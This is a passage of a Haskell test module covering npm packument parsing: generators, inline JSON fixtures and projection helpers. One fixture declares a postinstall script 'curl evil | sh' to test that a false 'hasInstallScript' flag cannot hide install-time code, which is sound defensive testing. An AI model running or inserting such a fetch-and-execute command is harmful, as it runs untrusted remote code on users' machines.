'fromInteger' lifts it into aeson's 'Number' 'Scientific').
-}
genInteger :: H.Gen Integer
genInteger = Gen.integral (Range.linearFrom 0 (-100000) 100000)

-- | A short arbitrary JSON string value (unicode, to probe text handling).
genJsonText :: H.Gen Text
genJsonText = Gen.text (Range.linear 0 8) Gen.unicode

{- | An object key drawn from a pool biased toward the packument field names the
projection reads, so generated objects frequently satisfy them (otherwise almost
every object would miss @name@\/@versions@ and the success arm would go
unsampled). @1.0.0@ is included so a generated @versions@ map can be keyed by the
version the @parseVersionDetails@ property requests.
-}
genKey :: H.Gen Key.Key
genKey = Key.fromText <$> Gen.choice [Gen.element packumentKeys, genJsonText]
  where
    packumentKeys =
        [ "name"
        , "version"
        , "dist-tags"
        , "versions"
        , "time"
        , "dist"
        , "tarball"
        , "shasum"
        , "integrity"
        , "scripts"
        , "license"
        , "deprecated"
        , "hasInstallScript"
        , "_npmUser"
        , "maintainers"
        , "dependencies"
        , "1.0.0"
        , "latest"
        ]

-- ── inline packument fixtures ────────────────────────────────────────────────

{- | A full-form packument whose single version declares a @postinstall@ script
and __no__ @hasInstallScript@ key, so install-script presence must be derived.
-}
fullPostinstallPackument :: ByteString
fullPostinstallPackument =
    "{\"name\":\"derived\",\"dist-tags\":{\"latest\":\"1.0.0\"},\"versions\":{\"1.0.0\":\
    \{\"name\":\"derived\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node x.js\"},\
    \\"dist\":{\"tarball\":\"https://r/derived/-/derived-1.0.0.tgz\"}}}}"

{- | A packument exercising all four npm dependency maps on one version, so each
'DepKind' is covered.
-}
allDepKindsPackument :: ByteString
allDepKindsPackument =
    "{\"name\":\"deps\",\"versions\":{\"1.0.0\":{\"name\":\"deps\",\"version\":\"1.0.0\",\
    \\"dependencies\":{\"runtime-dep\":\"^1.0.0\"},\"devDependencies\":{\"dev-dep\":\"^2.0.0\"},\
    \\"peerDependencies\":{\"peer-dep\":\"^3.0.0\"},\"optionalDependencies\":{\"optional-dep\":\"^4.0.0\"},\
    \\"dist\":{\"tarball\":\"https://r/deps/-/deps-1.0.0.tgz\"}}}}"

{- | A full-form packument whose single version sets @hasInstallScript:false@
explicitly, so install presence is a determination rather than a derivation.
-}
noInstallScriptPackument :: ByteString
noInstallScriptPackument =
    "{\"name\":\"noscript\",\"versions\":{\"1.0.0\":{\"name\":\"noscript\",\"version\":\"1.0.0\",\
    \\"hasInstallScript\":false,\"dist\":{\"tarball\":\"https://r/noscript/-/noscript-1.0.0.tgz\"}}}}"

{- | A full-form packument whose single version sets @hasInstallScript:false@ but
declares a real @postinstall@ script — the hostile mismatch a compromised upstream
could use to try to mask install-time code execution behind the flag. The two wire
fields are independent, so the projection must fail closed and honour the script.
-}
falseFlagWithPostinstallPackument :: ByteString
falseFlagWithPostinstallPackument =
    "{\"name\":\"liar\",\"versions\":{\"1.0.0\":{\"name\":\"liar\",\"version\":\"1.0.0\",\
    \\"hasInstallScript\":false,\"scripts\":{\"postinstall\":\"curl evil | sh\"},\
    \\"dist\":{\"tarball\":\"https://r/liar/-/liar-1.0.0.tgz\"}}}}"

-- | A packument whose single version declares per-version @maintainers@.
maintainersPackument :: ByteString
maintainersPackument =
    "{\"name\":\"maint\",\"versions\":{\"1.0.0\":{\"name\":\"maint\",\"version\":\"1.0.0\",\
    \\"maintainers\":[{\"name\":\"carol\",\"email\":\"carol@example.test\"}],\
    \\"dist\":{\"tarball\":\"https://r/maint/-/maint-1.0.0.tgz\"}}}}"

-- | A packument whose version's @dist@ reports an @unpackedSize@.
sizedPackument :: ByteString
sizedPackument =
    "{\"name\":\"sized\",\"versions\":{\"1.0.0\":{\"name\":\"sized\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/sized/-/sized-1.0.0.tgz\",\"unpackedSize\":6510}}}}"

-- | A packument whose tarball URL ends in a slash (no filename segment).
trailingSlashPackument :: ByteString
trailingSlashPackument =
    "{\"name\":\"slash\",\"versions\":{\"1.0.0\":{\"name\":\"slash\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/slash/\"}}}}"

-- | A packument whose version's @dist@ carries only the SRI @integrity@.
integrityOnlyPackument :: ByteString
integrityOnlyPackument =
    "{\"name\":\"intg\",\"versions\":{\"1.0.0\":{\"name\":\"intg\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/intg/-/intg-1.0.0.tgz\",\"integrity\":\"sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg==\"}}}}"

-- | A packument whose version's @dist@ carries only the legacy SHA-1 @shasum@.
shasumOnlyPackument :: ByteString
shasumOnlyPackument =
    "{\"name\":\"sha\",\"versions\":{\"1.0.0\":{\"name\":\"sha\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/sha/-/sha-1.0.0.tgz\",\"shasum\":\"da39a3ee5e6b4b0d3255bfef95601890afd80709\"}}}}"

{- | A packument whose version's @dist@ carries an __empty-string__ @shasum@ (and no
@integrity@): a present-but-content-empty digest the projection must treat as absent.
-}
emptyShasumPackument :: ByteString
emptyShasumPackument =
    "{\"name\":\"es\",\"versions\":{\"1.0.0\":{\"name\":\"es\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/es/-/es-1.0.0.tgz\",\"shasum\":\"\"}}}}"

{- | A packument whose version's @dist@ carries an __empty-string__ @integrity@ (and no
@shasum@): a present-but-content-empty digest the projection must treat as absent.
-}
emptyIntegrityPackument :: ByteString
emptyIntegrityPackument =
    "{\"name\":\"ei\",\"versions\":{\"1.0.0\":{\"name\":\"ei\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/ei/-/ei-1.0.0.tgz\",\"integrity\":\"\"}}}}"

{- | A packument whose version's @dist@ carries __both__ digests as empty strings: the
artifact projects to no 'Hash' at all (a truly hashless version).
-}
emptyBothPackument :: ByteString
emptyBothPackument =
    "{\"name\":\"eb\",\"versions\":{\"1.0.0\":{\"name\":\"eb\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/eb/-/eb-1.0.0.tgz\",\"shasum\":\"\",\"integrity\":\"\"}}}}"

{- | A packument whose 1.0.0 is healthy and three siblings are each broken in a
distinct required\/security-decisive field: 2.0.0's @dist@ is a scalar (not an
object), 3.0.0's @dist@ carries no @tarball@, and 4.0.0 is a bare scalar (not even
a version object). Under version-level graceful degradation each broken sibling is
dropped while the healthy 1.0.0 survives.
-}
mixedHealthAndBrokenPackument :: ByteString
mixedHealthAndBrokenPackument =
    "{\"name\":\"mix\",\"dist-tags\":{\"latest\":\"1.0.0\"},\"versions\":{\
    \\"1.0.0\":{\"name\":\"mix\",\"version\":\"1.0.0\",\"dist\":{\"tarball\":\"https://r/mix/-/mix-1.0.0.tgz\"}},\
    \\"2.0.0\":{\"name\":\"mix\",\"version\":\"2.0.0\",\"dist\":5},\
    \\"3.0.0\":{\"name\":\"mix\",\"version\":\"3.0.0\",\"dist\":{\"shasum\":\"abc\"}},\
    \\"4.0.0\":42}}"

{- | A packument whose 1.0.0 is healthy, 2.0.0 carries an out-of-range
@unpackedSize@ (@1e400@) and a signature missing its @keyid@, and 3.0.0 carries a
non-array @signatures@. Every version must __survive__ the production decode with
its advisory fields degraded — the complement to a required-field-broken version
being dropped. 2.0.0's @integrity@ is a well-formed SRI so the load-bearing digest
projects intact alongside the degraded size.
-}
advisoryJunkPackument :: ByteString
advisoryJunkPackument =
    "{\"name\":\"adv\",\"dist-tags\":{\"latest\":\"1.0.0\"},\"versions\":{\
    \\"1.0.0\":{\"name\":\"adv\",\"version\":\"1.0.0\",\"dist\":{\"tarball\":\"https://r/adv/-/adv-1.0.0.tgz\"}},\
    \\"2.0.0\":{\"name\":\"adv\",\"version\":\"2.0.0\",\"dist\":{\"tarball\":\"https://r/adv/-/adv-2.0.0.tgz\",\
    \\"integrity\":\"sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg==\",\
    \\"unpackedSize\":1e400,\"signatures\":[{\"sig\":\"x\"}]}},\
    \\"3.0.0\":{\"name\":\"adv\",\"version\":\"3.0.0\",\"dist\":{\"tarball\":\"https://r/adv/-/adv-3.0.0.tgz\",\"signatures\":5}}}}"

-- | A packument with three versions, to check version-list extraction.
multiVersionPackument :: ByteString
multiVersionPackument =
    "{\"name\":\"multi\",\"versions\":{\
    \\"1.0.0\":{\"name\":\"multi\",\"version\":\"1.0.0\",\"dist\":{\"tarball\":\"https://r/a.tgz\"}},\
    \\"1.2.0\":{\"name\":\"multi\",\"version\":\"1.2.0\",\"dist\":{\"tarball\":\"https://r/b.tgz\"}},\
    \\"2.0.0\":{\"name\":\"multi\",\"version\":\"2.0.0\",\"dist\":{\"tarball\":\"https://r/c.tgz\"}}}}"

-- ── helpers ──────────────────────────────────────────────────────────────────

-- | The canonical key of a 'PackageName' (verbatim for npm).
renderName :: PackageName -> Text
renderName = TS.toText . pkgCanonical

{- | The first projected 'Artifact' of a version. npm projects exactly one
artifact per version, so this is the whole of @pkgArtifacts@; taking the head of
the 'NonEmpty' is total.
-}
soleArtifact :: PackageDetails -> Artifact
soleArtifact d = let (art :| _) = pkgArtifacts d in art

{- | A path-independent view of a projection outcome, so the whole-packument projection
('parsePackageInfoFromValue' then a version lookup) and the version-targeted projection
('parseVersionDetailsFromValue') can be compared for __exact__ agreement. A decode\/name
'ParseError', a name mismatch, and a match (carrying the projected version count and the
requested version's details, or its absence) are the three arms both paths share.
-}
data Outcome
    = LeftErr ParseError
    | Mismatch Text
    | Matched Int (Maybe PackageDetails)
    deriving stock (Eq, Show)

{- | The whole-packument projection's outcome at a requested version: project the full
'PackageInfo', then read the version out of @infoVersions@ (the exact path the serve
layer's @selectPrivateArtifact@ took before it was narrowed).
-}
fullOutcome :: PackageName -> Value -> Version -> Outcome
fullOutcome route v ver = case parsePackageInfoFromValue route v of
    Left e -> LeftErr e
    Right (NameMismatch reported) -> Mismatch reported
    Right (Projected info) ->
        Matched (Map.size (infoVersions info)) (Map.lookup (renderVersion ver) (infoVersions info))

-- | The version-targeted projection's outcome at a requested version.
targetedOutcome :: PackageName -> Value -> Version -> Outcome
targetedOutcome route v ver = case parseVersionDetailsFromValue route v ver of
    Left e -> LeftErr e
    Right (VersionNameMismatch reported) -> Mismatch reported
    Right (VersionProjected count details) -> Matched count details

-- | The 'PackageDetails' the whole-packument projection holds at a version, if any.
fullDetails :: PackageName -> Value -> Version -> Maybe PackageDetails
fullDetails route v ver = case parsePackageInfoFromValue route v of
    Right (Projected info) -> Map.lookup (renderVersion ver) (infoVersions info)
    _ -> Nothing

-- | The 'PackageDetails' the version-targeted projection yields for a version, if any.
targetedDetails :: PackageName -> Value -> Version -> Maybe PackageDetails
targetedDetails route v ver = case parseVersionDetailsFromValue route v ver of
    Right (VersionProjected _ details) -> details
    _ -> Nothing

{- | Select the artifact a filename names from a version's details — the pure gate
@selectPrivateArtifact@\/@gatePublicVersion@ run downstream ('artifactFor'),
replicated here to show identical details entail an identical selected 'Artifact'.
-}
selectArtifact :: Text -> Maybe PackageDetails -> Maybe Artifact
selectArtifact file = (>>= find ((== file) . artFilename) . pkgArtifacts)

-- | Whether a targeted outcome is a match that selected a present version.
isMatchedJust :: Outcome -> Bool
isMatchedJust = \case
    Matched _ (Just _) -> True
    _ -> False

-- | Whether a targeted outcome is a match for which the requested version was absent.
isMatchedNothing :: Outcome -> Bool
isMatchedNothing = \case
    Matched _ Nothing -> True
    _ -> False

-- | Whether a 'CodeExecSignal' is one of the @RunsCodeOnInstall@ determinations.
runsCode :: CodeExecSignal -> Bool
runsCode = \case
    RunsCodeOnInstall _ -> True
    _ -> False

{- | Decode a JSON literal into a 'Value', failing the example on an undecodable
literal. Used to drive 'parsePackageInfoFromValue' — the entry the serve path
projects an already-decoded body with — directly from an inline packument.
-}
decodeValue :: ByteString -> IO Value
decodeValue bs = either (\e -> fail ("decode failure: " <> e)) pure (eitherDecodeStrict bs)

{- | Read a committed fixture body by name (under @core\/test\/unit\/fixtures\/npm\/@,
the path Cabal runs tests from).
-}
readFixture :: FilePath -> IO ByteString
readFixture name = readFileBS ("core/test/unit/fixtures/npm/" <> name)

{- | Project a fixture into a 'PackageInfo' under the given route-requested name,
failing the example with the 'ParseError' message on a projection (or name-validation)
failure.
-}
projectFixture :: PackageName -> FilePath -> IO PackageInfo
projectFixture route name = do
    body <- readFixture name
    orFailParse (parsePackageInfo route (RegistryResponse body))

-- | An unscoped npm 'PackageName' (the common case in these fixtures).
unscoped :: Text -> PackageName
unscoped = mkPackageName Npm Nothing

-- | A minimal packument 'Value' self-reporting the given top-level @name@.
packumentValueNamed :: Text -> Value
packumentValueNamed nm = object ["name" .= nm, "versions" .= object []]

-- | A response body for a minimal packument self-reporting the given @name@.
responseNamed :: Text -> RegistryResponse
responseNamed nm = RegistryResponse (BL.toStrict (encode (packumentValueNamed nm)))

{- | The npm route name a packument 'Value' self-reports (scope-aware), used to feed
the projection a matching requested name in the totality property so a well-shaped
body reaches the success arm.
-}
routeNameOf :: Value -> PackageName
routeNameOf v = npmName (nameOf v)
  where
    nameOf :: Value -> Text
    nameOf value = case value of
        Object o -> case KeyMap.lookup "name" o of
            Just (String t) -> t
            _ -> ""
        _ -> ""

    npmName :: Text -> PackageName
    npmName raw = case T.stripPrefix "@" raw of
        Just afterAt
            | (scopeText, rest) <- T.break (== '/') afterAt
            , bare <- T.drop 1 rest
            , not (T.null scopeText)
            , not (T.null bare) ->
                mkPackageName Npm (Just (mkScope scopeText)) bare
        _ -> mkPackageName Npm Nothing raw

-- | Project one version of a fixture into its 'PackageDetails'.
projectVersion :: FilePath -> Version -> IO PackageDetails
projectVersion name version = do
    body <- readFixture name
    orFailParse (parseVersionDetails (RegistryResponse body) version)

-- | Project one version of an inline packument body into its 'PackageDetails'.
projectVersionOf :: ByteString -> Version -> IO PackageDetails
projectVersionOf body version =
    orFailParse (parseVersionDetails (RegistryResponse body) version)

{- | Unwrap a projection result, failing the example with the 'ParseError'
message rather than crashing — keeping the suite total (no partial @error@).
-}
orFailParse :: Either ParseError a -> IO a
orFailParse = either expectationFailureWith pure

-- | Fail the running example with a 'ParseError' message.
expectationFailureWith :: ParseError -> IO a
expectationFailureWith e = fail ("unexpected ParseError: " <> show e)

{- | Parse an ISO-8601 timestamp for an expectation, in the example's own
'MonadFail' so an unparseable literal fails the test rather than crashing.
-}
readUTC :: (MonadFail m) => Text -> m UTCTime
readUTC = iso8601ParseM . toString
